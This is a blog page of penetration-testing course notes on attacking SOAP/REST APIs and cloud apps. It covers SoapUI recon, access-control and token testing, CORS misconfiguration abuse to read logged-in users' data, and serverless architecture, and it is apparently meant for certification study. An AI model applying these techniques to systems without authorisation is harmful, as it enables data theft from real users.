@@ -1,0 +1,1308 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>14 - APIs &amp; Cloud Apps |</title>
+<meta name="description" content="Attacking APIs &amp; Cloud Based Applications ">
+
+
+  <meta name="author" content="Nullified">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="">
+<meta property="og:title" content="14 - APIs &amp; Cloud Apps">
+<meta property="og:url" content="http://localhost:4000/notes/ewptx/apiscloud/">
+
+
+  <meta property="og:description" content="Attacking APIs &amp; Cloud Based Applications ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/main/header4.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-12-06T00:00:00+06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/notes/ewptx/apiscloud/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "john",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
+<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/menu">Menu</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+  
+    
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header4.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          14 - APIs &amp; Cloud Apps
+
+        
+      </h1>
+      
+        <p class="page__lead">Attacking APIs &amp; Cloud Based Applications
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  23 minute read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+  
+    
+      
+      
+      
+      
+    
+    
+      
+
+<nav class="nav__list">
+  
+  <input id="ac-toc" name="accordion-toc" type="checkbox" />
+  <label for="ac-toc">Toggle menu</label>
+  <ul class="nav__items">
+    
+      <li>
+        
+          <span class="nav__sub-title">Posts</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
+          
+            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
+          
+            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">Notes</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/notes/ejpt/">eJPT</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/ecppt/">eCPPTv2</a></li>
+          
+            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
+          
+            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
+          
+            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
+          
+            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
+          
+            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
+          
+            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/pnpt/">PNPT</a></li>
+          
+            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
+          
+            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
+          
+            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
+          
+            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/eewptx/">eWPTXv2</a></li>
+          
+            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
+          
+            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
+          
+            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
+          
+            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
+          
+            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
+          
+            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
+          
+            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
+          
+            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
+          
+            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
+          
+            <li><a href="/notes/ewptx/apiscloud/" class="active">- APIs & Cloud Apps</a></li>
+          
+            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="">Active Directory Exploitation</a></li>
+          
+            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
+          
+            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
+          
+            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crtp/">CRTP</a></li>
+          
+            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
+          
+            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
+          
+            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
+          
+            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crte/">CRTE</a></li>
+          
+            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
+          
+            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">My CVEs</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
+          
+            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
+          
+        </ul>
+        
+      </li>
+    
+  </ul>
+</nav>
+
+    
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="14 - APIs &amp; Cloud Apps">
+    <meta itemprop="description" content="Attacking APIs &amp; Cloud Based Applications">
+    <meta itemprop="datePublished" content="2023-12-06T00:00:00+06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#apis--cloud-apps">APIs &amp; Cloud Apps</a>
+    <ul>
+      <li><a href="#introduction-to-apis">Introduction to APIs</a></li>
+      <li><a href="#api-testing-and-attacking">API Testing and Attacking</a></li>
+      <li><a href="#api-access-control">API Access Control</a></li>
+      <li><a href="#resource-sharing">Resource Sharing</a></li>
+      <li><a href="#attacking-cloud-based-apps">Attacking Cloud Based Apps</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+<h1 id="apis--cloud-apps">APIs &amp; Cloud Apps</h1>
+
+<ul>
+  <li>Introduction to APIs</li>
+  <li>API Testing &amp; Attacking</li>
+  <li>API Access Control</li>
+  <li>Resource Sharing</li>
+  <li>Attacking Cloud Based Applications</li>
+</ul>
+
+<p>Objetives:</p>
+
+<ul>
+  <li>Attacking API based applications</li>
+  <li>Common vulnerabilities found in Cloud environments</li>
+</ul>
+
+<h2 id="introduction-to-apis">Introduction to APIs</h2>
+<p>API = Application Programming Interface</p>
+
+<ul>
+  <li>Its a non-GUI collection of endpoints in a standardized form so it can be used by human user as well as a machine. Its often accompanied by documentation that can be in both a machine and a human-readable form</li>
+</ul>
+
+<p>There are lots of APIs, For example:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Windows API
+- Remote APIs (RPC  - remote procedure call)
+- Web APIs 
+# Web services (SOAP/XML)
+# REST APIs (JSON) 
+</code></pre></div></div>
+
+<p>APIs differs from a website because:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- It has a standardized input/output form so that it can be scripted
+- Its language independent (it should work on each platform in the same way)
+- It aims to be secure (e.g. it allows only some predefined methods)
+</code></pre></div></div>
+
+<p>SOAP APIs utilizes the Simple Object Access Protocol to define communication standard - so how the request and response looks, as well as the parameters can be passed in them.</p>
+
+<p>SOAP Messages (HTTP Requests) are an XML type and must contain some special elements</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Content type text/xml is also allowed
+- SOAPAction is sometimes used just For the standard and sometimes needs to hold the called method name
+</code></pre></div></div>
+
+<p><img src="/assets/images/posts/ewptx/101.png" alt="Alt text" class="align-center" /></p>
+
+<p><img src="/assets/images/posts/ewptx/102.png" alt="Alt text" class="align-center" /></p>
+
+<p>API Contains both human and machine-readable documentation. For SOAP-based APIs, the documentation is stored in WSDL files. Usually, these files are stored under the <strong>?wsdl</strong> path</p>
+
+<p>→ https://api.example.com/api/?wsdl</p>
+
+<p>Take a look at an examplary calculator service online:</p>
+
+<p>→ http://www.dneonline.com/calculator.asmx</p>
+
+<p>At the following address:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>→ http://www.dneonline.com/calculator.asmx?op=Add
+# u can see an examplary SOAP request that was issued in order to speak to the calculator service
+
+→ http://www.dneonline.com/calculator.asmx?wsdl
+# to see the full WSDL
+</code></pre></div></div>
+
+<p>This kind of interface, equipped with documentation that can be parsed by a machine, allows us to expose a large number of methods where each of them has its own purpose.</p>
+
+<ul>
+  <li>Another type of API is REST (Representation State Transfer) APIs.</li>
+</ul>
+
+<p>Usually, the method client is about to call is in the resource path:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /api/v2/methodName
+</code></pre></div></div>
+
+<ul>
+  <li>Depending on the request type, the parameters might be passed differently</li>
+</ul>
+
+<p>In REST APIs, HTTP methods have some special meaning:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET    - Read   resource
+POST   - Create resource
+PUT    - Update resource
+DELETE - Delete resource
+PATCH  - Update resource partially
+</code></pre></div></div>
+
+<p>Except For GET requests, API methods parameters are passed in the request body</p>
+
+<blockquote>
+  <p>Remember, that the meaning of these methods is a common practice and not a requirement, so technically its possible that a method you encounter does something different (e.g. POST is used For logging in)</p>
+</blockquote>
+
+<p>An exemplary REST API request:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Path often contains the API version
+- Content-type application/json header is required
+- Parameters are passed as JSON array
+</code></pre></div></div>
+
+<p>Its also often possible to pass the REST API parameters as XML, so the equivalent of the request from the previous slide would look like the listing to the right</p>
+
+<p>REST API also has a documentation standard called the WADL file.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.w3.org/Submission/wadl/
+</code></pre></div></div>
+
+<p>Similar to WSDL, we will shortly present tools that help to parse the lengthy file in order not to rewrite all the methods manually.</p>
+
+<ul>
+  <li>In order to make dev (and pentester) lives easier, some APIs include a more human-friendly API representation. For example, a very popular API engine name <strong>Swagger</strong> is often found with its demo page, which contains forms with description and possibility to issue a request to each method.</li>
+</ul>
+
+<p>You can see sample Swagger API here:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://swagger.io/tools/swagger-ui/
+</code></pre></div></div>
+
+<h3 id="resources">Resources</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- https://swagger.io/
+- https://www.w3.org/TR/wsdl.html
+- https://www.w3.org/Submission/wadl/
+- https://www.w3.org/TR/soap/
+</code></pre></div></div>
+
+<h2 id="api-testing-and-attacking">API Testing and Attacking</h2>
+<p>APIs are built in a way that one request path (one endpoint) allows us to call one method (execute one type of action).</p>
+
+<ul>
+  <li>
+    <p>The path we are requesting is an abstract mapping to some resources; that means, when requesting the endpoint /api/v3/methodName, it does not reflect file/directory structure on the server.</p>
+  </li>
+  <li>The request is processed by a special component that maps the path to certain operation handlers and not to physical file/directory resources</li>
+  <li>However, do not be discouraged from using your favorite content discovery tools on the API enabled server. Some server paths can be mapped to the API routines, but still, some requests can be handled by the server in an original way allowing it to expose files and directories to the user.</li>
+</ul>
+
+<p>Regardless of the fact that APIs make use of predefined methods, you should be aware that there can still be vulnerabilities related to:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Parameters to these predefined functions
+- The API parsing itself
+- Access to sensitive methods
+</code></pre></div></div>
+
+<p>First u should focus on the proper reconnaissance of the API interface:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- What is the API name and version?
+- Its a custom implementation or a open-source product?
+- Is there any online documentation available?
+- Are there any interesting methods?
+- Does the documentation exist on the target server (?wsdl, ?wadl, or similar)?
+- Does the API require authentication, or is publicy available?
+- If there is both local and public documentation For an API, do they match?
+- Maybe some methods were hidden from local users (typically ones that allow insecure operations)
+</code></pre></div></div>
+
+<blockquote>
+  <p>Gather as many API endpoints as possible 
+U should also be able to get the WSDL/WADL file For further testing</p>
+</blockquote>
+
+<ul>
+  <li>Reconstructing API calls from a raw WSDL/WADL file would be time-consuming, so a proper tool might help you to do it faster.</li>
+  <li>For API testing and parsing WSDL/WADL files into a ready-to-use method set, you might want to use <strong>Postman</strong>, the free edition of <strong>SOAPUI</strong>, or the Burp PRO extension called <strong>WSDLer</strong></li>
+</ul>
+
+<h3 id="soapui">SOAPUI</h3>
+<p>→ https://www.soapui.org/downloads/latest-release.html</p>
+
+<p>SoapUI can be launched from its default location</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/local/bin/SoapUI-5.5.0
+locate SoapUI
+</code></pre></div></div>
+
+<p>First connect it to the proxy, in this case, the Burpsuite instance. This way, u will be able to replay and change requests issued to the API. To set up the proxy, you need to go to File</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  -&gt; Preferences -&gt; Proxy Settings and point it to BURP instance
+</code></pre></div></div>
+
+<p><img src="/assets/images/posts/ewptx/103.png" alt="Alt text" class="align-center" /></p>
+
+<blockquote>
+  <p>You can then switch the proxying on and off by clicking the Proxy Button on the upper menu.</p>
+</blockquote>
+
+<ul>
+  <li>Lets now try to parse the sample WSDL/WADL file. There are sample files shipped with the software itself</li>
+  <li>In order to load a WSDL (For SOAP) or WADL (For REST), click the respective buttons in the SoapUI on the upper menu.</li>
+</ul>
+
+<blockquote>
+  <p>By default, u can find example WSDL/WADL files in /root/SoapUI-Tutorials/WSDL-WADL/</p>
+</blockquote>
+
+<ul>
+  <li>If u now click on a tree node and then double click on <strong>Request</strong>, a request window will appear. In this case, we are viewing the <strong>login</strong> method.</li>
+</ul>
+
+<p><img src="/assets/images/posts/ewptx/104.png" alt="Alt text" class="align-center" /></p>
+
+<p>The method can be found in the WSDL file as well. SoapUI automatically fills argument placeholders with <strong>?</strong>. Its u who should decide what to fill in there.</p>
+
+<ul>
+  <li>In that case, we see that the application expects the argument of type <strong>String</strong></li>
+  <li>If u press the green button, the request will be issued and, in this case, will be proxied through Burp Suite.</li>
+</ul>
+
+<p><img src="/assets/images/posts/ewptx/105.png" alt="Alt text" class="align-center" /></p>
+
+<h3 id="rest">REST</h3>
+<p>Testing REST APIs can be done exactly in the same way; The difference is you import a WADL file instead of WSDL</p>
+
+<ul>
+  <li>So, once u encounter a WSDL on the web app, u can copy its source
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(Open it in a Browser, go to Source, and select all -&gt; copy &amp; past to a file) and import it to SoapUI
+</code></pre></div>    </div>
+  </li>
+  <li>The API is another transport mechanism For some information that is sent to the API Consumer (app back-end)</li>
+  <li>With this is mind,  u can try to tamper with everything that is transported by the API - For example, in case of a request similar to the previously presented one, you are free to check if the username or passwords field is vulnerable to injection attacks</li>
+</ul>
+
+<p><img src="/assets/images/posts/ewptx/106.png" alt="Alt text" class="align-center" /></p>
+
+<blockquote>
+  <p>The API implementation itself might be vulnerable to XXE attacks; However, modern APIs usually disallow DTD declarations</p>
+</blockquote>
+
+<p><img src="/assets/images/posts/ewptx/107.png" alt="Alt text" class="align-center" /></p>
+
+<p>Basically, u r free to tamper with any of the API parameters as long as the SOAP message structure is correct.</p>
+
+<blockquote>
+  <p>In case u wanna to smuggle XML-style data, u can wrap them up in <strong>CDATA tags</strong> (XML comments), so the SOAP message is valid</p>
+</blockquote>
+
+<p><img src="/assets/images/posts/ewptx/108.png" alt="Alt text" class="align-center" /></p>
+
+<h2 id="api-access-control">API Access Control</h2>
+<p>In APIs, u will rarely see cookies being used. More often, the authentication mechanism will be basic authorization or a kind of token</p>
+
+<ul>
+  <li>It can be a pre-generated token that will be equivalent of a cookie</li>
+</ul>
+
+<p>For example in the form of a header like:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>X-Api-Token:&lt;token&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>What often is found in the APIs is broken access control.</li>
+  <li>Authorization Bypasses are very common</li>
+</ul>
+
+<p>In order to test an API in a complex way For Access Control flaws, one need to:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Prepare a working request to each API endpoint
+- Generate a token (or authorization header) For each of the API users
+- Combine each API request with each token to see which will work and which do not
+- Remember to test each request, also without any token
+</code></pre></div></div>
+
+<ul>
+  <li>Such tests cases might be generated using SoapUI, which allows us to test issue a request to each API endpoint.</li>
+  <li>Also, as a reminder, double check if the API implementation uses all the methods provided by the original version</li>
+</ul>
+
+<p>WIth <strong>Rundeck API</strong> there is a default possibility of running OS commands, which might be hidden from the documentation on a local API implementation.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://docs.rundeck.com/docs/api/rundeck-api.html#adhoc
+</code></pre></div></div>
+
+<p>API Tokens are susceptible to vulnerabilities commonly diagnosed in session cookies, For example:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Low entropy or predictable value
+- Lack of invalidation
+- Possible token leaks from the application infrastructure or possibility to generate tokens in advance
+</code></pre></div></div>
+
+<blockquote>
+  <p>Tokens that might grant u access to an API interface are JWT Tokens, as well as the <strong>Bearer Authentication</strong></p>
+</blockquote>
+
+<h2 id="resource-sharing">Resource Sharing</h2>
+<p>As APIs are meant to be accessed by automated agents in order to lose SOP contraints a bit, the Cross-Origin Resource Sharing standard was implemented.</p>
+
+<ul>
+  <li>Simply put, CORS can add some exceptions to SOP by specifying some special headers in the server response.</li>
+</ul>
+
+<p>We will be interested in two of these headers:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Access-Control-Allow-Origin: [value]
+- Access-Control-Allow-Credentials: [true/false]
+</code></pre></div></div>
+
+<blockquote>
+  <p>The first one specifies a domain that can access a certain websites response
+The second one specifies if its possible to add credentialing information (e.g. cookies) to the request</p>
+</blockquote>
+
+<p>Access-Control-Allow-Origin value can be a domain, a wildcard or null</p>
+
+<ul>
+  <li>A wildcard means that a script hosted on any domain can access a response from that webpage</li>
+  <li>A certain domain value means that scripts (or any other user) from that domain can access the response</li>
+</ul>
+
+<p>If the page victim.com sends back the header <strong>Access-Control-Allow-Origin: example.com</strong>, that means that if a XHR requesting victim.com script is hosted on example.com, and if the user visits example.com, the script will access victim.com as the user and receive the response.</p>
+
+<p>However, if its a static page, then nothing special happens unless the victim.com allows another header <strong>Access-Control-Allow-Credentials: true</strong></p>
+
+<ul>
+  <li>
+    <p>In that case, if the user is logged on victim.com and visits the mentioned script on example.com, victim.com will be visited in the context of logged-in users (the cookies will be sent with an XHR request) and restricted content can be stolen!</p>
+  </li>
+  <li>
+    <p>Browsers by default block responses if a site is overly permissive (if they allow wildcard origin together with credentials)</p>
+  </li>
+</ul>
+
+<blockquote>
+  <p>Trust with credentials to the arbritrary origin is a common vulnerability, not only in APIs.</p>
+</blockquote>
+
+<blockquote>
+  <p>That means if a page is accessible only For logged in users and it trusts the arbitrary origin, an exploit script can be hosted on a attacker controlled domain.</p>
+</blockquote>
+
+<blockquote>
+  <p>Once visited by a user logged in on the target website, it can steal sensitive information - user data or CSRF tokens.</p>
+</blockquote>
+
+<h3 id="simple-exploitation-case">Simple exploitation Case</h3>
+<p>Lets take a look at a simple exploitation case. We will issue a similar XHR request to a CORS-enabled page</p>
+
+<p>A file is hosted on a php-enabled apache server</p>
+
+<p><img src="/assets/images/posts/ewptx/109.png" alt="Alt text" class="align-center" /></p>
+
+<p><img src="/assets/images/posts/ewptx/110.png" alt="Alt text" class="align-center" /></p>
+
+<p>If u now navigate to that page while using BURP as a proxy, u can observe how it reacts to a custom <strong>Origin</strong> Header</p>
+
+<p><img src="/assets/images/posts/ewptx/111.png" alt="Alt text" class="align-center" /></p>
+
+<p>The XHR script is now midified and example.com is replaced with The CORS enabled page</p>
+
+<p><img src="/assets/images/posts/ewptx/112.png" alt="Alt text" class="align-center" /></p>
+
+<p>U can now observe that access to the response was gained. In an exploitation scenario, u may instead want to send this data to your controlled server in a similar way that you would steal a cookie using an XSS vuln.</p>
+
+<p><img src="/assets/images/posts/ewptx/113.png" alt="Alt text" class="align-center" /></p>
+
+<h2 id="attacking-cloud-based-apps">Attacking Cloud Based Apps</h2>
+
+<p><strong>Microservices</strong>: Different architectures and design evolution</p>
+
+<h3 id="monolithic-design">Monolithic Design:</h3>
+<p>One server is used For holding the web app and needed services such as databases. This offers an easy setup and ease of maintenance at a relatively cheap price but introduces several disadvantages.</p>
+
+<ul>
+  <li>Monolithic designs are difficult to scale and although the maintenance is relateively easy, updating the server could cause doentimes and having a single point of failure can be a disaster if there is no backup plan in place.</li>
+</ul>
+
+<h3 id="tiered-monolithic">Tiered Monolithic:</h3>
+<p>Services are separated, the web server is holding the web app while a different server is holding the database or required services.</p>
+
+<ul>
+  <li>Tiered monolithic architecture offers the possibility of performing updates without downtime and if server are clustered and load-balanced the performance improves over the previous approach.</li>
+  <li>Tiered monolithic designs are still hard to scale this is something that cannot be automated and if the cluster itself can be a single point of failure that can only be recovered from backups in case a disaster occurs.</li>
+</ul>
+
+<h3 id="cloud-solutions">Cloud Solutions:</h3>
+<p>Cloud solutions are build into elastic servers or services. This means horizontal scaling is possible to implement and fully automate, giving a better performance as new instances are created based on the resources needed.</p>
+
+<ul>
+  <li>Updates can also be performed without downtime and disasters do not involve backups in most of the cases. Although there are a lot of advantages over the previous designs, there are still problems at the application layer as its still one big codebase (monolithic) and costs can be hard to foreseen depending on the services needed.</li>
+</ul>
+
+<h3 id="serverless-applications">Serverless Applications</h3>
+<p>Function as a Services (FaaS) - Are serverless applications, usually code functions , running in a cloud environment. This cloud environment and the application attack is managed by the cloud operator. As a result, it has the advantage of avoiding the complexity of building and maintaining the infrastructure typically associated with developing and launching an app.</p>
+
+<ul>
+  <li>Serverless applications have some limitations to be aware of, the execution time is limited to a few minutes, threads, usable disk space and ram are also limitations and there is the need of a trigger/event to run the app and a routing method or API gateway.</li>
+</ul>
+
+<blockquote>
+  <p>With this limitations in mind, serverless applications are not the best option For resources demanding jobs or tasks that need more than 10 minutes of execution.</p>
+</blockquote>
+
+<h4 id="details-of-serverless-architecture">Details of Serverless Architecture</h4>
+<ul>
+  <li><strong>API Routing</strong>: Routing layer calling the application based on the URL association, rules and paramaters. They make the functions to be reached from the internet.</li>
+</ul>
+
+<p>In AWS its called API Gateway.</p>
+
+<ul>
+  <li><strong>State</strong>: As mentioned before, the lifespan of a function is no more than a few minutes, For this reason there is no local cache that can be used and vulnerabilities like file command injections or file uploads are exploited in a different way due to this facts.</li>
+  <li><strong>Cold Start</strong>: As the lifespan is limited, when the code has not been executed in a while or For the first time, it needs to be downloaded, containerized, booted, and primed to be run. This can be solved using 3rd party plugins like:</li>
+</ul>
+
+<p>→ http://github.com/Fidellimited/serverless-plugin-warmup</p>
+
+<ul>
+  <li><strong>Debugging</strong>: Having the benefit of not managing the infrastructure means there are limitations with debugging due to the lack of access to logs. Instead of logging, another approaches such as printing variables or local lambda are usually put in practice For debugging applications.</li>
+  <li>
+    <p><strong>No Ops</strong>: Limited sysadmin tasks as the environment is managed by the cloud operator. Backups, security monitoring and logging its still necessary.</p>
+  </li>
+  <li>With microservices and serverless apps there are some changes related to security. Network security changes drastically as the security model of functions does not rely on IP addresses and ports. Instead, they share the same external IP address and there are no local network restriction For them inside the host.</li>
+</ul>
+
+<blockquote>
+  <p>Although network restrictions are barely used, in order to apply restrictions cloud provided access controls and permissions are used.</p>
+</blockquote>
+
+<h4 id="serverless-application-example">Serverless Application Example</h4>
+<p>AWS account is necessary FOr this test</p>
+
+<ul>
+  <li>https://github.com/OWASP/DVSA</li>
+</ul>
+
+<p>Go to <strong>https://aws.amazon.com/lambda</strong> to start creating a function:</p>
